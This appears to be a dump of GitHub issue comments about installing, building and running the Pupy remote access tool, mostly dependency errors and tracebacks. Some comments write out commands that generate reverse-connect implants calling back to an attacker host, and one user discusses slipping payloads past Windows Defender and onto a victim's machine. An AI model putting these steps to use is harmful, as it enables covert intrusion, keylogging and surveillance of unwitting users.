    "dimpol": "Yeap wrong output I have also tried with gnuwin32.sourceforge.net/packages/make.htm and www.equation.com/servlet/equation.cmd?fa=make (GNU make for windows) with the same results. I must be doing something really stupid but I don't know what exactly I am screwing up....\n. It was a wrong msvcr90.dll..you can close this. Sorry for the bother\n. found it. unfortunately not working on the linux compromised machine :(. ",
    "ta69": "Thanks a lot! I still have some questions/confusion if you don't mind :)\nAfter generating the payload using:\npython pupygen.py -f ps1 connect --host MYIPADDRESS:443\nThe file payload.ps1 was generated, and this file could be safely put on the Client computer without being removed by Windows Defender.\nThen I run\npython pupysh.py\nHowever, running info results in [ - ] no clients currently connected, and running\nconnect --host MYIPADDRESS:443 results in timeout. \nAm I doing something wrong? Am I supposed to do something with the payload.ps1 file? Right now I just placed it on the Desktop and did nothing with it\n. Feel confused, as someone who's never done anything in any way related to RAT then I don't think my questions and apparently mistakes are that stupid? I mean if you a day ago had no idea what RAT meant, what a payload was, never heard about reflective dll, etc. wouldn't my steps seem somewhat logical? Initially I also thought that after generating the .exe then would just run it on the host (hoping this exe would automatically run on startup), and if generating a dll then perhaps would have to link it with an .exe (but both automatically deleted by Windows Defender), etc. I've never seen a .ps1 file before so not sure how to run it, but yeah, I guess need to run it somehow..\nAssuming you don't feel I'm a hopeless case and wasting your time (I guess you can easily tell I won't be able to do any contribution besides maybe some documentation), then I do hope you can provide some more detailed instructions; I'm not a troll, I'd just really like to use this application :)\n. Thanks a lot everyone :)\n@amainyebriggs if I put the dll inside some .zip archive, then as soon as the Client open the archive it should be possible to establish a connection? But I guess doing it this way means that if the user extracts the archive then it will get caught by the Windows Defender, and it's not possible to ensure the user won't be able to extract since if you password-protect the zip archive then it won't be able to get injected into memory..?\n@void-in I tried to run the powershell like you said, and I get the exact same warning message as in your screenshot. But after running then it's still not possible to connect the client from the server.\nI start server using: python pupysh.py\nThen I get the -- Pupy shell -- welcome message with v1.3 and author info. \nWhen I try to write info then I still get [ - ] no clients currently connected\nWhen I try to write connect --host IPADDROFPCRUNNINGSERVER:443 then I still get timeout. \nThe order I used: connect server THEN open ps1 in powershell THEN insert connect --host MYIPADDRESS:443 in the server terminal. Both the server and the client have a working internet connection.\n(I've also tried to run connect --host IPADDROFPCRUNNINGSERVER:443 -t http, connect --host IPADDROFPCRUNNINGSERVER:443 -t ssl, etc. but they all result in timeout)\nEDIT: This is the error code when trying to connect from the server\n```\n\n\nconnect --host 87.72.XXX.XXX:443\nTraceback (most recent call last):\n  File \u201cpupysh.py\", line 78, in \n    pcmd.cmdloop()\n  File \"/home/ta/code/pupy/pupy/pupylib/PupyCmd.py\", line 275 in cmdloop\n    cmd.Cmd.cmdloop(self, intro)\n  File \"/usr/lib/python2.7/cmd.py\", line 142, in cmdloop\n    stop = self.onecmd(line)\n  File \"/usr/lib/python2.7/cmd.py\", line 221, in onecmd\n    return func(arg)\n  File \"/home/ta/code/pupy/pupy/pupylib/PupyCmd.py\", line 551, in do_connect\n    self.pupsrv.connect_on_client(arg)\n  File \"/home/ta/code/pupy/pupy/pupylib/PupyServer.py\", line 490, in connect_on_client\n    stream=launcher.iterate().next()\n  File \"/home/ta/code/pupy/pupy/network/lib/launchers/connect.py\", line 56, in iterate\n    s=client.connect(self.rhost, self.rport)\n  File \"/home/ta/code/pupy/pupy/network/lib/clients.py\", line 104, in connect\n    s=super(PupySSLClient, self).connect(host, port)\n  File \"/home/ta/code/pupy/pupy/network/lib/clients.py\", line 34, in connect\n    s.connect(sockaddr)\n  File \"/usr/lib/python2.7/socket.py\", line 228, in meth\n    return getattr(self._sock,name)(*args)\ntimeout: timed out\n``\n. Thanks a lot, I think it's almost working. At first I got my IP by googling \"my ip address\", for which Google returned my public IP address.. I guess I shouldn't use this IP address(?), so I tried to get it by running thehostname -I` command, and then followed your instructions.\n\n\nAfter I start the server (python pupysh.py --port 443) I run\n```\n\n\nconnect --host 192.168.X.XXX:443\n[%] Connecting ...\n```\n\n\nBut nothing happens after that, and typing info still shows no clients currently connected. I disabled the firewall completely so I don't think there's anything blocking the connection. Any ideas? Maybe I'm still using the wrong IP address?\n. Oh yes, I misunderstood - I did try to follow the wiki. The reason I ran connect --host MYIP:443 was because nothing happened after first connecting to the server python pupysh.py --port 443 and then running the ps1 file with PowerShell.. and when I typed help on the server I saw the connect command was available.\nBut the IP address I use (hostname -I) and the commands to generate the payload and start the server (the ones you gave me) should be correct and all it takes to get it working? And the reason it's not working must be because the connection is being blocked (which is weird because I disabled the firewall and I don't use any AV software)? \n. @void-in I followed your command python pupygen.py -f ps1 -o pupy.ps1 connect --host MYUBUNTUIPADDR:443\nI just tried with virtualbox instead of over the internet, and it works great. How would I go about getting it to run over the internet?\n. ",
    "androidgittt": "@aurcioli-handy So It doesnt work on android then?\n. ",
    "asyazwan": "I tried on my Android 6.0.1. Neither the provided APK nor the one I manually build works (API 19). They crashed with:\n22265 22292 I python  : Android kivy bootstrap done. __name__ is __main__\n22265 22292 I python  : Run user program, change dir and execute main.py\n22265 22292 I python  :   File \"<string>\", line 86, in load_module\n22265 22292 I python  :   File \"<memimport>/network/lib/streams/PupyAsyncStream.py\", line 10, in <module>\n22265 22292 I python  :   File \"/home/pupy/pupy/client/android_sources/.buildozer/android/platform/python-for-android/build/python-install/lib/python2.7/multiprocessing/__init__.py\", line 84, in <module>\n22265 22292 I python  : PupyPackageLoader: Error while loading package network.lib.streams.PupyAsyncStream (py) : No module named _multiprocessing\n22265 22292 I python  :   File \"<string>\", line 86, in load_module\n22265 22292 I python  :   File \"<memimport>/network/lib/streams/__init__.py\", line 4, in <module>\n22265 22292 I python  :   File \"<string>\", line 118, in load_module\n22265 22292 I python  : PupyPackageLoader: Error while loading package network.lib.streams (py) : No module named _multiprocessing\n22265 22292 I python  :   File \"<string>\", line 99, in load_module\n22265 22292 I python  :   File \"/home/pupy/pupy/pupy/network/lib/__init__.py\", line 1, in <module>\n22265 22292 I python  :   File \"<string>\", line 118, in load_module\n22265 22292 I python  : PupyPackageLoader: Error while loading package network.lib (pyc) : No module named _multiprocessing\n22265 22292 I python  :   File \"<string>\", line 86, in load_module\n22265 22292 I python  :   File \"<memimport>/network/conf.py\", line 6, in <module>\n22265 22292 I python  :   File \"<string>\", line 118, in load_module\n22265 22292 I python  : PupyPackageLoader: Error while loading package network.conf (py) : No module named _multiprocessing\n22265 22292 I python  : Traceback (most recent call last):\n22265 22292 I python  :   File \"/home/pupy/pupy/client/android_sources/.buildozer/android/app/service/main.py\", line 11, in <module>\n22265 22292 I python  :   File \"/tmp/tmp_pupy_TpLOQk/pp.py\", line 1, in <module>\n22265 22292 I python  :   File \"<string>\", line 59, in <module>\n22265 22292 I python  :   File \"<string>\", line 118, in load_module\n22265 22292 I python  : ImportError: No module named _multiprocessing\n22265 22292 I python  : Python for android ended.\nAt least OP got it to trying to connect. That error is a curious one since Android doesn't support multiprocessing from what I gather. Since I'm not familiar with Kivy/P4A I'm gonna try again later when I have more time to investigate. If you're gonna try to build make sure you're using P4A old_toolchain branch.\n@aurcioli-handy What Android version and what commands you generated payloads with? I get that error when trying py/win payloads. Seems like launcher configs got messed up because the same payload manually ran with --host x.x.x.x -t rsa works.\n. Yeah, it's working now with the multithread patch. Got it to connect and all, but like you said some modules are still throwing exception. Thanks.\n. Have you tried installing pyyaml package?\n. That would be pointless... Try out your generated payload or build it yourself and ensure pyyaml package is included. That's what I'd do. I remember getting this problem too when trying out of the box.\n. What you built is unsigned package to be the template replacement of pupy.apk. Use of pupygen.py with proper params will take that apk and sign it, then you can install as normal app.\n. ",
    "BIGNASTY202": "Thank you very much for quick reply appreciate it :)\n. The fix i used for this was to do these simple steps:\n1. sudo -i\n2. paste the install in root terminal\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule update --init --depth 1 pupy/payload_templates\ngit submodule init\ngit submodule update\npip install -r requirements.txt\n3.And if it worked then you can now use pupygen as sudo or in the root terminal \nhope this helped people with the permission problem like me!\n. ",
    "ljesparis": "on the victim machine??\n. ",
    "goshawkwarm": "Ah ok, thanks.\nSo, I need a old version, to reconnect with my old clients first, right ?\n. ",
    "totoroha": "i think this is the result you want to see:\n[*] Server started on port 443 with transport ssl\nOn Mon, Sep 26, 2016 at 3:44 AM, Waqas Ali notifications@github.com wrote:\n\nWhen you run the pupy payload on the Windows 10 machine, were you\nlistening for the incoming connection? You need to start the pupy server on\nthe specified port first and then execute the generated exe.\nsudo ./pupysh.py --port 443\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/182#issuecomment-249512686, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AG_RjNMx7Ki77HSD-qEF7WGiPU3z__xOks5qt4X5gaJpZM4KGO6p\n.\n. \n",
    "ArThoX": "$ python -c \"import rpyc\"\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\nImportError: No module named rpyc\nrpyc seems not installed at all ..\nI easy_installed it, now ImportError: No module named yaml, had to install pyyaml too.\nSeems fine now. But I dont know now if this is supposed to be install following the wiki and something is wrong, or if they are prerequisites.\n. Now\n./pupygen.py -f py connect --transport ssl --host 192.168.150.64\nWARNING:root:pycrypto not available, using pure python libraries (slower)\nWARNING:root:pycrypto not available, using pure python libraries (slower)\nWARNING:root:Could not load transport obfs3 : No module named Crypto.Cipher. Transport disabled\nWARNING:root:Could not load transport scramblesuit : No module named Crypto.Hash.SHA256. Transport disabled\n[+] generating payload ...\nTraceback (most recent call last):\n  File \"./pupygen.py\", line 396, in <module>\n    packed_payload=pack_py_payload(get_raw_conf(conf))\n  File \"/Users/serveurachat/Downloads/pupy/pupy/pupylib/payloads/py_oneliner.py\", line 38, in pack_py_payload\n    modules_dic=gen_package_pickled_dic(pyasn1.__path__[0],\"pyasn1\")\n  File \"/Users/serveurachat/Downloads/pupy/pupy/pupylib/payloads/python_packer.py\", line 45, in gen_package_pickled_dic\n    raise NameError(\"path %s not found\"%path)\nNameError: path /Library/Python/2.7/site-packages/pyasn1-0.1.9-py2.7.egg/pyasn1 not found\n. @quentinhardy Thanks for your answers; but I have already done that.\nI will try to clean my pip/python and reinstall..\n. Same issue, \nNameError: path /Library/Python/2.7/site-packages/pyasn1-0.1.9-py2.7.egg/pyasn1 not found\nPS: /Library/Python/2.7/site-packages/pyasn1-0.1.9-py2.7.egg exists on my hd.\n. I must say I have no idea how to make it work.\nEgg unzipped, but the .egg error still happens.\n. Such obviousness :D (I didn't know what was the use of an egg yesterday).\nThanks for the help.\n. ;'( k\n. ",
    "Aspect9": "such installing dependencies - nammit\n. ",
    "ChristopherShawn": "Would this be caused by a build script error?  It doesn't seem to be creating the .lin or .so files, and my linux_x86.zip files grow to ~2GB when building new payloads. I did it that way at first, but with argparse, the code is cleaner with --host, --host, --host. I think this would be related to #363 . ",
    "hsluoyz": "Hi. Npcap will install into C:\\Windows\\System32\\Npcapif Install Npcap in WinPcap API-compatible Mode is not chosen in the installer, which is by default. You can see this docs about how to use Npcap first when Npcap and WinPcap coexist.\n. ",
    "udaybhasker007": "I made my ip address 127.0.0.1 in pupy.conf so it started running but I can not capture screenshots or keylogger.\nThank you, Appreciate your work\n. ",
    "gitxmax": "2018-12-16 06:52:08,967| Module not found: _scandir\nTraceback (most recent call last):\n  File \"/root/pupy/pupy/pupylib/PupyJob.py\", line 162, in module_worker\n    module.import_dependencies()\n  File \"/root/pupy/pupy/pupylib/PupyModule.py\", line 440, in import_dependencies\n    self.client.load_package(dependencies, new_deps=self.new_deps)\n  File \"/root/pupy/pupy/pupylib/PupyClient.py\", line 473, in load_package\n    raise ValueError('Module not found: {}'.format(e))\nValueError: Module not found: _scandir\n[-] Module not found: _scandir\nGetting the error...\n\"pip install scandir\"\nRequirement already satisfied: scandir in /usr/local/lib/python2.7/dist-packages (1.9.0)\ntried reinstalling with easy_install and compiling from source, the problem persists.\n. Thanks\nInstalling some of the dependencies seemed to have helped, no errors so far\n-e external/pykcp\nrpyc==3.4.4\npycryptodome==3.7.0\npsutil\nrsa\nnetaddr\ntinyec\nposter\nu-msgpack-python\ndnslib\nwould be great to have a client compiled, but I'm not that strong at cross compiling.... ",
    "enjutomojamutote": "Duplicated? \n. ",
    "Xx-KaAzZ-xX": "Hi guys , sry for the long time replying.\nI'm quite surprising for the ps1toexe script , it is written in bash but I have to run it in a Windows Environment if I understand well ?\n. ",
    "vincentcox-work": "Any idea on how to do this? I haven't found a setting in the buildozer.spec file.\nI am testing this on a x86 vm:\n\n. Thanks for clearing that up! I'll try it again with AVD (Android Studio). Thank you very much, that dit the trick. However, I think I'm very close, but a new error appeared:\n```\nAndroid packages installation done.\nCheck application requirements\nCheck garden requirements\nCompile platform\nDistribution compiled.\nBuild the application #1\nPatched service/main.py to include applibs\nPackage the application\nTraceback (most recent call last):\n  File \"/usr/local/bin/buildozer\", line 11, in \n    load_entry_point('buildozer==0.33.dev0', 'console_scripts', 'buildozer')()\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/scripts/client.py\", line 13, in main\n    Buildozer().run_command(sys.argv[1:])\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/init.py\", line 1029, in run_command\n    self.target.run_commands(args)\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/target.py\", line 90, in run_commands\n    func(args)\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/target.py\", line 107, in cmd_release\n    self.buildozer.build()\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/init.py\", line 211, in build\n    self.target.build_package()\n  File \"/usr/local/lib/python2.7/dist-packages/buildozer-0.33.dev0-py2.7.egg/buildozer/targets/android.py\", line 765, in build_package\n    copyfile(join(dist_dir, 'bin', apk), join(self.buildozer.bin_dir, apk))\n  File \"/usr/lib/python2.7/shutil.py\", line 82, in copyfile\n    with open(src, 'rb') as fsrc:\nIOError: [Errno 2] No such file or directory: u'/root/pupy/client/android_sources/.buildozer/android/platform/python-for-android/dist/myapp/bin/MyApplication-0.1-release.apk'\ncopying the generated apk to ../../pupy/payload_templates/pupy.apk\ncp: cannot stat 'bin/Pupy-0.1-release-unsigned.apk': No such file or directory\n```\nI really appreciate the time you take by answering these questions. . I fixed it by making editing the last line of build.sh to \"cp bin/pupy-0.1-release.apk ../../pupy/payload_templates/pupy.apk\". I also had to edit the buildozer.spec file to change the name to \"pupy\" instead of \"My Application\". ",
    "nyrewan": "Wow, great work.\nI had a look at UDP - f5227e79a14b520722b337832e903dd2080e6d2e broke it for me, but also the switch from threading to multiprocessing in 9169fa350b71d919d2e2c78d3d39086f05d984ae also stopped it working\nIf you revert changes to these files (i've attached a copy for convenience) :\n- pupy/network/lib/servers.py servers.py.txt\n- pupy/network/lib/streams/PupyAsyncStream.py PupyAsyncStream.py.txt\n- pupy/network/lib/streams/PupySocketStream.py PupySocketStream.py.txt\nthen UDP works again for me (although only the python client, probably need to recompile the binaries to get the exe to work?)\nIt would be a shame to lose it, keeping it and making it reliable would be fantastic. What do you think about either a new 'reliable' transport that could stack over UDP, or could we stack TCP over UDP and let TCP take care of retransmission etc? (and then stack crypto ontop of that :-) )\nThanks again!\n. ",
    "benichmt1": "Seems to be an issue with Pillow on Ubuntu 14.04\n. ",
    "domecort": "fix Lazagne head #191 , even though i don't know how to change it. anyone? can help pls? \n. ",
    "Axe-Usa": "and one little question more it's allocated in memory but when you turn off the pc then where is allocated?. i think i'm not good like you but i think when something is opensource doesnt mean that will be more detected. This deppend of the payload how you did or if you encrypted the payload and the source of puppy is important too. The contrary when something is private and is publied fastly will be detected however when something is opensource and is updated a lot of time for different person's with new code it's more difficult to be detected by antivirus.. i get this error.\n\nERROR:root:[Errno 99] Cannot assign requested address\nTraceback (most recent call last):\n  File \"/home/omar/Github/pupy/pupy/pupylib/PupyServer.py\", line 297, in run\n    self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)\n  File \"/home/omar/Github/pupy/pupy/network/lib/servers.py\", line 119, in init\n    ThreadedServer.init(self, args, kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/rpyc/utils/server.py\", line 78, in init\n    self.listener.bind((hostname, port))\n  File \"/usr/lib/python2.7/socket.py\", line 228, in meth\n    return getattr(self._sock,name)(args)\nerror: [Errno 99] Cannot assign requested address\n\nmy configuration file is:\n\n[pupyd]\nlisten on all interfaces by default\naddress = 192.168.1.8\nport = 81\nipv6 = true\nkeyfile = crypto/server.pem\ncertfile = crypto/cert.pem\n[cmdline]\ndisplay_banner = yes\ncolors = yes\n[aliases]\ninfo = get_info\npyexec = pyexec\nexec = shell_exec\nps = ps\nmigrate = migrate\nshell=interactive_shell\nkill = process_kill\ngetpid = getpid\ngetppid = getppid\npwd = pyexec -c 'import os;print os.getcwd()'\ntasklist = shell_exec 'tasklist /v'\nmount = drives\n. with this you create your own payload using metasploit? One question about payload templates this has some relation or it's a totally different thing. My dude is it's possible to make my own templates for pupy. And i can use a meterpreter reverse shell payload for pupy? Thanks and i will check all this documentation.\n\nWhen i say shell code i am refering to : \n\na shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called \"shellcode\" because it typically starts a command shell. nice release!. \n",
    "i128": "Yup, you're right, was able to compile via build scripts. Closing. ",
    "gmod74": "Wait how did you fix this? Or am I just not seeing something.... ",
    "htpasswd": "I had the same issue, but solved it by installing dependencies like this:\ngit clone https://github.com/n1nj4sec/pupy.git pupy-master\ncd pupy-master\ngit submodule init\ngit submodule update\npip install -r requirements.txt. ",
    "dwendt": "Yeah, there's connections in the TCP table (on server) that are still showing as \"established\", however, the client has been disconnected for a few minutes.\nI'll try out the debug template to get more details when running in this sort of situation. \nI've spent a while looking, where does a pupy client handle checking if an established transport is alive still? It seems to me that that would be handled by the timeouts in PupySocketStream's poll functions, but I couldn't follow where the values for those are set. It'd make sense for the transport to decide on the timeouts, but that doesn't seem to be the case either.\nhttps://github.com/n1nj4sec/pupy/blob/fcfc731b8897f312131a20c9a6a298bfb8373051/pupy/pp.py#L232\nMaybe this timeout should be configurable? If a client is offline when it runs this loop, we shouldn't hold the loop back for a minute before attempting the launchers again. \nAll this is because I'd be interested in writing the code to make the delay between connection/keepalive checks more configurable. Low-delay checks would be preferable in a poor network so that clients stay responsive to the server.. ",
    "Kaizokuou99": "wht???????????. can i get your fb or something.. i wanna talk with you. is it okay with this?\nDEBUG =False``. @void-in the problem is, i dont know what is wrong with this.. i followed all the steps given.. but it still not working. \nis it okay?. thanks. ",
    "tristandostaler": "Thanks!. ",
    "matsaa93": "one thing i have not maked an bug report on git before so if there is some thing i forgot \nnot sure if i have done the report right . ok i will do that \nthanks . ",
    "horllste": "wow...got the same error too on new installation.. root@sect:~/pupy/pupy# ./pupygen.py connect --host 192.168.178.1:7777 -s keylogger\nusage: connect [-h] --host \n               [-t {obfs3,http,tcp_cleartext,rsa,udp_secure,ssl,ec4,scramblesuit,udp_cleartext,ssl_rsa}]\n               ...\nroot@sect:~/pupy/pupy# ./pupygen.py connect --host 192.168.178.1:7777 -s keylogger -t http\nusage: connect [-h] --host \n               [-t {obfs3,http,tcp_cleartext,rsa,udp_secure,ssl,ec4,scramblesuit,udp_cleartext,ssl_rsa}]\n               ...\nroot@sect:~/pupy/pupy# ./pupygen.py connect --host 192.168.178.1:7777 -s KEYLOGGER\nusage: connect [-h] --host \n               [-t {obfs3,http,tcp_cleartext,rsa,udp_secure,ssl,ec4,scramblesuit,udp_cleartext,ssl_rsa}]\n               ...\nroot@sect:~/pupy/pupy# ./pupygen.py connect --host 192.168.178.1:7777 -s keylogger\nusage: connect [-h] --host \n               [-t {obfs3,http,tcp_cleartext,rsa,udp_secure,ssl,ec4,scramblesuit,udp_cleartext,ssl_rsa}]\nthats what i got each time.. thanks man, you made my day. ",
    "traget": "Same here. Yes. Also, generating an apk payload returns an error that may be related to this issue, but I ll make a a new issue for that. . My git version is 2.11.0, and I never used the  --depth option, also by removing everything, you mean deleting the pupy directory, or that and reinstalling git. . I tried to remove pupy and then download it again.. nothing changed.. n1nj4sec: I may sound stupid cuz I don't know how git exactly works, but can't we get Lazagne from you instead of Alessandro since you forked his project? \nAgain, I don't really understand from where git gets the submodules so this may not make sens.. Correct me if I'm wrong.. . jboss38: how to do that... Like git clone *Lazagne repo* inside /pupy/external/LaZagne? . Nope :(\nHere is the output: \ngit clone --shallow-submodules --recursive https://github.com/n1nj4sec/pupy.git\nCloning into 'pupy'...\nremote: Counting objects: 6547, done.\nremote: Compressing objects: 100% (35/35), done.\nremote: Total 6547 (delta 16), reused 0 (delta 0), pack-reused 6512\nReceiving objects: 100% (6547/6547), 23.75 MiB | 4.53 MiB/s, done.\nResolving deltas: 100% (4150/4150), done.\nSubmodule 'client/sources-linux/linux-inject' (https://github.com/gaffe23/linux-inject.git) registered for path 'client/sources-linux/linux-inject'\nSubmodule 'pupy/external/LaZagne' (https://github.com/AlessandroZ/LaZagne) registered for path 'pupy/external/LaZagne'\nSubmodule 'pupy/external/impacket' (https://github.com/CoreSecurity/impacket) registered for path 'pupy/external/impacket'\nSubmodule 'pupy/memorpy' (https://github.com/n1nj4sec/memorpy) registered for path 'pupy/external/memorpy'\nSubmodule 'pupy/external/pywerview' (https://github.com/the-useless-one/pywerview.git) registered for path 'pupy/external/pywerview'\nSubmodule 'pupy/packages/src/scapy' (https://github.com/secdev/scapy) registered for path 'pupy/external/scapy'\nSubmodule 'pupy/external/winpty' (https://github.com/alxchk/winpty) registered for path 'pupy/external/winpty'\nSubmodule 'pupy/payload_templates' (https://github.com/n1nj4sec/pupy-binaries.git) registered for path 'pupy/payload_templates'\nCloning into '/root/pupy/client/sources-linux/linux-inject'...\nremote: Counting objects: 16, done.\nremote: Compressing objects: 100% (16/16), done.\nremote: Total 16 (delta 2), reused 3 (delta 0), pack-reused 0\nCloning into '/root/pupy/pupy/external/LaZagne'...\nremote: Counting objects: 124, done.\nremote: Compressing objects: 100% (120/120), done.\nremote: Total 124 (delta 16), reused 43 (delta 1), pack-reused 0\nReceiving objects: 100% (124/124), 481.53 KiB | 0 bytes/s, done.\nResolving deltas: 100% (16/16), done.\nCloning into '/root/pupy/pupy/external/impacket'...\nremote: Counting objects: 219, done.\nremote: Compressing objects: 100% (206/206), done.\nremote: Total 219 (delta 21), reused 47 (delta 11), pack-reused 0\nReceiving objects: 100% (219/219), 1.14 MiB | 1.88 MiB/s, done.\nResolving deltas: 100% (21/21), done.\nCloning into '/root/pupy/pupy/external/memorpy'...\nremote: Counting objects: 22, done.\nremote: Compressing objects: 100% (21/21), done.\nremote: Total 22 (delta 2), reused 12 (delta 0), pack-reused 0\nCloning into '/root/pupy/pupy/external/pywerview'...\nremote: Counting objects: 26, done.\nremote: Compressing objects: 100% (22/22), done.\nremote: Total 26 (delta 0), reused 10 (delta 0), pack-reused 0\nCloning into '/root/pupy/pupy/external/scapy'...\nremote: Counting objects: 242, done.\nremote: Compressing objects: 100% (237/237), done.\nremote: Total 242 (delta 8), reused 98 (delta 1), pack-reused 0\nReceiving objects: 100% (242/242), 1.57 MiB | 604.00 KiB/s, done.\nResolving deltas: 100% (8/8), done.\nCloning into '/root/pupy/pupy/external/winpty'...\nremote: Counting objects: 190, done.\nremote: Compressing objects: 100% (179/179), done.\nremote: Total 190 (delta 49), reused 67 (delta 9), pack-reused 0\nReceiving objects: 100% (190/190), 235.91 KiB | 0 bytes/s, done.\nResolving deltas: 100% (49/49), done.\nCloning into '/root/pupy/pupy/payload_templates'...\nremote: Counting objects: 8, done.\nremote: Compressing objects: 100% (5/5), done.\nremote: Total 8 (delta 2), reused 6 (delta 2), pack-reused 0\nremote: Total 0 (delta 0), reused 0 (delta 0), pack-reused 0\nerror: no such remote ref ce6d7e4b1d6c06b2fb36548e23d62685a1f91209\nFetched in submodule path 'client/sources-linux/linux-inject', but it did not contain ce6d7e4b1d6c06b2fb36548e23d62685a1f91209. Direct fetching of that commit\n. Man, I did it! :)\nYou were right using the depth option. \nHere is how:\ngit clone https://github.com/n1nj4sec/pupy.git\ncd pupy\ngit submodule init\ngit submodule update --depth 1000\nThank you very much! . But I still get an error when trying to generate a payload :'( \n[+] generating payload ...\n[+] packaging the apk ... (can take 10-20 seconds)\n/bin/sh: 1: jarsigner: not found\nTraceback (most recent call last):\n  File \"./pupygen.py\", line 415, in \n    get_edit_apk(os.path.join(ROOT, \"payload_templates\",\"pupy.apk\"), outpath, conf)  File \"./pupygen.py\", line 222, in get_edit_apk\n    res=subprocess.check_output(\"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key\"%new_path, shell=True)\n  File \"/usr/lib/python2.7/subprocess.py\", line 219, in check_output\n    raise CalledProcessError(retcode, cmd, output=output)\nsubprocess.CalledProcessError: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword 'pupy.apk' pupy_key' returned non-zero exit status 127\nroot@kali-arm64:~/pupy/pupy#. Hm.. Already fixed that. :) \nI needed default-jdk. :P\n. ",
    "pyx86": "me too , I followed exactly the installation instructions\n. ",
    "jdjdbsudgskdododolldlx": "I have an error help me\nError name is\nImporterror: no module named tornado.ioloop\nWhat's happend?. ",
    "ShawnCena121": "Hey I have a problem installing pupy.\nAfter i run the command pip install -r pupy/requirements.txt i get an error\nplz help ASAP. ",
    "samdunsavy": "Mine is 6.0.1 I guess that's the problem.... Managed to get that buildozer spec file but now my build is failing with buildozer saying failed to execute the command. [dx] Exception in thread \"main\" java.lang.UnsupportedClassVersionError: com/android/dx/command/Main : Unsupported major.minor version 52.0. Thats already suggested and acknowledged... If I am not wrong. https://github.com/n1nj4sec/pupy/issues/97. It's marked as \"Android\" and \"Feature\" isn't it?. It's added by the developer... So they will work on it when the time is right. So I guess you can close your issue now. ",
    "ChipWolf": "ID 10 T Error.. ",
    "its-arun": "root@kali:~/pupy# git submodule update --depth 1000\nfatal: Needed a single revision\nUnable to find current revision in submodule path 'pupy/external/LaZagne'\n. I am currently having issues with Latest build of Kali (Auto Logout during usage) so can't test right now. I will open this issue once I am running stable build.. ",
    "Kulme": "kali linux?\ntry with ubuntu. ",
    "molospg": "Issue still exists. Any known workaround? \nEdit: \napt-get update && apt-get upgrade\nreboot\nworked for me. . ",
    "HarryR": "I didn't notice that memdlopen was already included, but after reviewing the source code I see that the .so is still written to disk, this leaves a forensic footprint...\nIs it worth adding 'memfd' support?. Why use ReflectiveSO when its significantly more complex and only supports x86_64?\nMemfd support can be detected at compile time without a configure script, it should gracefully fallback - syscall will return ENOSYS, and will work across all architectures.\nAs it is the tmplibrary code seems to do the job, portably and cleanly, while memfd should be a relatively simple patch.. If there's one thing that sounds fun but very tedious is adding support for new architectures to an ELF loader... Not something I would be very happy to maintain.\nAnyway, aside from glibc's syscall wrapper, it has no dependency on glibc, so no ABI or link time dependency, iirc the syscall function has existed for a very long time. The only thing necessary is recent Linux kernel headers at compile time to get the syacall number specific to the architecture.\nHmm, so ya its probably worth me having a quick go at this when I get back to a Linux box.. Yay!. ",
    "alimp5": "@n1nj4sec n1nj4sec \nHi again :x \nthe ./buildenv.sh script installed requirements. but  ./build.sh failed:\nroot@kali:~/pouya21_MSF_WUI/pupy/client/sources# ./build.sh \nrm -f .obj\nrm -f .pyo\nrm -f .pyc\nrm -f .txt\nrm -f _txt.c\nrm -f _pyc.c\nrm -f _dll.c\nrm -f resources/.pyo\nrm -f resources/.pyc\nrm -f resources/.txt\nrm -f resources/_txt.c\nrm -f resources/library.zip\nrm -f resources/python27.dll\nrm -f resources/msvcr90.dll\n/root/pouya21_MSF_WUI/pupy/client/sources/buildenv/win32/cl.sh /c  /DWIN_X86 /nologo main_exe.c\nmake: /root/pouya21_MSF_WUI/pupy/client/sources/buildenv/win32/cl.sh: Command not found\nMakefile.linux:85: recipe for target 'main_exe.obj' failed\nmake:  [main_exe.obj] Error 127\nrm -f .obj\nrm -f .pyo\nrm -f .pyc\nrm -f .txt\nrm -f _txt.c\nrm -f _pyc.c\nrm -f _dll.c\nrm -f resources/.pyo\nrm -f resources/.pyc\nrm -f resources/.txt\nrm -f resources/_txt.c\nrm -f resources/library.zip\nrm -f resources/python27.dll\nrm -f resources/msvcr90.dll\n/root/pouya21_MSF_WUI/pupy/client/sources/buildenv/win64/cl.sh /c  /DWIN_X64 /D_WIN64 /nologo main_exe.c\nmake: /root/pouya21_MSF_WUI/pupy/client/sources/buildenv/win64/cl.sh: Command not found\nMakefile.linux:85: recipe for target 'main_exe.obj' failed\nmake:  [main_exe.obj] Error 127\nThanks in advance \n. I have another problem with  Android in build.sh for android-sources:\nI tried with Y and N for question, but script failed.\nroot@kali:~/pouya21_MSF_WUI/pupy/client/android_sources# ./build.sh \nBuildozer is running as root!\nThis is not recommended, and may lead to problems later.\nAre you sure you want to continue [y/n]? y\n()()()Ensure build layout\nNo buildozer.spec found in the current directory. Abandon.\ncat: ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\nPatching AndroidManifest template for BOOT_COMPLETED\nsed: can't read ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\nPatching AndroidManifest template for excludeFromRecents\nsed: can't read ./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml: No such file or directory\ncp: cannot create regular file '.buildozer/android/platform/python-for-android/dist/pupy/src/': No 